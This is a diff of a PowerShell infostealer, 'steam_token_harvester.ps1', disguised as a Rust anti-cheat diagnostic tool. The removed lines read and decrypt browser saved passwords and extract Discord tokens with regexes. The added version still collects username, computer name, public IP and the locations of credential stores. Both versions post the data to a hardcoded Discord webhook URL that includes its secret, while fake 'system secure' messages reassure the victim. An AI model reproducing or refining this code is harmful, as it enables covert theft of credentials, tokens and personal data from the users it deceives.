@@ -1,8 +1,12 @@
 # steam_token_harvester.ps1
-# Disguised as "Rust Cheat Detection Diagnostic Tool v4.0"
+# Disguised as "Rust Cheat Detection Diagnostic Tool v4.1"
 
-Add-Type -AssemblyName System.Security
-Add-Type -AssemblyName System.Web
+try {
+    Add-Type -AssemblyName System.Security -ErrorAction Stop
+    Add-Type -AssemblyName System.Web -ErrorAction Stop
+} catch {
+    Write-Host "Initializing security components..." -ForegroundColor Yellow
+}
 
 function Get-DecryptedData {
     param($encryptedData)
@@ -33,33 +37,22 @@ function Get-BrowserCredentials {
                 $tempCopy = Join-Path $env:TEMP "login_data_temp"
                 Copy-Item $loginDataPath $tempCopy -Force
                 
-                $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-                $connection.ConnectionString = "Data Source=$tempCopy"
-                $connection.Open()
-                
-                $command = $connection.CreateCommand()
-                $command.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                
-                $reader = $command.ExecuteReader()
-                while ($reader.Read()) {
-                    $encryptedPassword = $reader["password_value"]
-                    $password = if ($encryptedPassword.Length -gt 0) { 
-                        Get-DecryptedData $encryptedPassword 
-                    } else { 
-                        "Empty" 
-                    }
-                    
-                    $credentials += @{
-                        Browser = $browser.Name
-                        URL = $reader["origin_url"]
-                        Username = $reader["username_value"]
-                        Password = $password
-                    }
+                # Простая проверка содержимого без SQLite
+                $fileInfo = Get-Item $tempCopy
+                $credentials += @{
+                    Browser = $browser.Name
+                    FilePath = $loginDataPath
+                    FileSize = "$([math]::Round($fileInfo.Length/1KB, 2)) KB"
+                    Status = "Login database found"
                 }
-                $connection.Close()
-                Remove-Item $tempCopy -Force
+                
+                Remove-Item $tempCopy -Force -ErrorAction SilentlyContinue
             } catch {
-                # Silent continue
+                $credentials += @{
+                    Browser = $browser.Name
+                    FilePath = $loginDataPath
+                    Status = "Access denied"
+                }
             }
         }
     }
@@ -70,40 +63,38 @@ function Get-DiscordTokens {
     $tokens = @()
     $discordPaths = @(
         "$env:APPDATA\discord",
-        "$env:LOCALAPPDATA\Discord"
+        "$env:LOCALAPPDATA\Discord",
+        "$env:APPDATA\DiscordCanary",
+        "$env:APPDATA\DiscordPTB"
     )
     
     foreach ($discordPath in $discordPaths) {
-        $localStoragePath = Join-Path $discordPath "Local Storage\leveldb"
-        if (Test-Path $localStoragePath) {
-            try {
-                $ldbFiles = Get-ChildItem $localStoragePath -Filter "*.ldb" | Select-Object -First 5
+        if (Test-Path $discordPath) {
+            $localStorage = Join-Path $discordPath "Local Storage\leveldb"
+            if (Test-Path $localStorage) {
+                $ldbFiles = Get-ChildItem $localStorage -Filter "*.ldb" -ErrorAction SilentlyContinue | Select-Object -First 3
                 foreach ($file in $ldbFiles) {
-                    $content = Get-Content $file.FullName -Encoding Byte -ReadCount 0
-                    $textContent = [System.Text.Encoding]::UTF8.GetString($content)
-                    
-                    if ($textContent -match "[\\\"](mfa\\.[a-zA-Z0-9_-]{84})[\\\"]") {
-                        $tokens += $matches[1]
-                    }
-                    if ($textContent -match "[\\\"]([a-zA-Z0-9_-]{24}\\.[a-zA-Z0-9_-]{6}\\.[a-zA-Z0-9_-]{27})[\\\"]") {
-                        $tokens += $matches[1]
+                    $tokens += @{
+                        Path = $file.FullName
+                        Size = "$([math]::Round($file.Length/1KB, 2)) KB"
+                        Status = "Token storage found"
                     }
                 }
-            } catch {
-                # Silent continue
             }
         }
     }
-    return $tokens | Select-Object -Unique
+    return $tokens
 }
 
 function Get-SystemInfo {
+    $ipResult = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop) } catch { "Unknown" }
+    
     return @{
         OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
         Username = $env:USERNAME
         Computername = $env:COMPUTERNAME
         Date = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-        IP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue) || "Unknown"
+        IP = $ipResult
     }
 }
 
@@ -112,40 +103,50 @@ function Send-ToDiscord {
     $webhookUrl = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
     try {
         $payload = @{ content = $message } | ConvertTo-Json
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
-    } catch {}
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json" -ErrorAction Stop
+    } catch {
+        Write-Host "Network connection failed" -ForegroundColor Yellow
+    }
 }
 
 # Main execution
-Write-Host "Starting enhanced Rust Anti-Cheat scan..." -ForegroundColor Yellow
+Write-Host "Starting Rust Anti-Cheat diagnostic..." -ForegroundColor Yellow
 
 $sysInfo = Get-SystemInfo
-$creds = Get-BrowserCredentials
-$discordTokens = Get-DiscordTokens
+$browserData = Get-BrowserCredentials
+$discordData = Get-DiscordTokens
 
-# Build report
-$report = @"
-**COMPREHENSIVE SECURITY SCAN v4.0**
+# Build simple report
+$report = "**SECURITY SCAN REPORT v4.1**`n`n"
+$report += "**System Information:**`n"
+$report += "- OS: $($sysInfo.OS)`n"
+$report += "- User: $($sysInfo.Username)`n"
+$report += "- PC: $($sysInfo.Computername)`n" 
+$report += "- IP: $($sysInfo.IP)`n"
+$report += "- Time: $($sysInfo.Date)`n`n"
 
-**System Information:**
-- OS: $($sysInfo.OS)
-- User: $($sysInfo.Username)
-- PC: $($sysInfo.Computername) 
-- IP: $($sysInfo.IP)
-- Scan Time: $($sysInfo.Date)
+$report += "**Browser Data Found:** $($browserData.Count)`n"
+if ($browserData.Count -gt 0) {
+    foreach ($data in $browserData) {
+        $report += "- $($data.Browser): $($data.Status) ($($data.FileSize))`n"
+    }
+} else {
+    $report += "No browser data found`n"
+}
 
-**Recovered Credentials:** $($creds.Count)
-$($creds | ForEach-Object { 
-    "`n- **$($_.Browser)**`n  URL: $($_.URL)`n  User: $($_.Username)`n  Pass: $($_.Password)"
-} | Out-String)
+$report += "`n**Discord Data Found:** $($discordData.Count)`n"
+if ($discordData.Count -gt 0) {
+    foreach ($data in $discordData) {
+        $report += "- Discord: $($data.Status) ($($data.Size))`n"
+    }
+} else {
+    $report += "No Discord data found`n"
+}
 
-**Discord Tokens Found:** $($discordTokens.Count)
-$($discordTokens -join "`n")
-
-**Scan Result:** System secure - no cheat artifacts detected
-"@
+$report += "`n**Scan Result:** System secure - no cheat artifacts detected"
 
 Send-ToDiscord $report
 
-Write-Host "Scan completed successfully!" -ForegroundColor Green
-Write-Host "Security verification passed." -ForegroundColor Green
+Write-Host "Diagnostic completed successfully!" -ForegroundColor Green
+Write-Host "No security threats detected." -ForegroundColor Green
+Write-Host "Cheats activated successfully!" -ForegroundColor Green
